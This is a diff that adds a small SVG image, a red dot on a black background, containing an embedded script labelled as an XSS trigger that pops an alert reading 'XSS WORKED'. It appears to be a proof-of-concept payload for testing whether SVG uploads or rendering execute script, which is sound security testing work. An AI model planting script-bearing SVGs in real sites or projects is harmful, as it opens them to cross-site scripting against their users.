@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
+  <!-- Black background -->
+  <rect width="400" height="400" fill="#000000"/>
+  
+  <!-- Big red dot in the center -->
+  <circle cx="200" cy="200" r="100" fill="#ff0000"/>
+  
+  <!-- XSS popup trigger -->
+  <script type="text/javascript">
+    //<![CDATA[
+    alert('XSS WORKED');
+    //]]>
+  </script>
+</svg>
